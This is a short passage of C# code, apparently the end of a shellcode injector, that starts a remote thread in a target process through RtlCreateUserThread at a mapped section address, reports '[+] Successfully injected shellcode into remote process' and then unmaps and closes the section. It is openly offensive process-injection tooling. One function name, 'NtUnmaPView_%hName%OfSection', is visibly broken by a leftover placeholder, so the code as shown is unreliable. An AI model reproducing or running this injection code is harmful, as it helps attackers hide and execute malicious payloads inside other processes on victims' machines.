                //CreateRemoteThread(hRemoteProcess, IntPtr.Zero, 0, baseAddressR, IntPtr.Zero, 0, IntPtr.Zero)
                IntPtr threadHandle = new IntPtr();
                if (RtlCreateUserThread(hRemoteProcess, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, baseAddressR, IntPtr.Zero, ref threadHandle, IntPtr.Zero) != IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to create a remote thread");
                    return;
                }

                Console.WriteLine($"[+] Successfully injected shellcode into remote process ({processId})");

                // Clean up
                NtUnmaPView_%hName%OfSection(hLocalProcess, baseAddressL);
                NtClose(hSection);
            }
        }
    }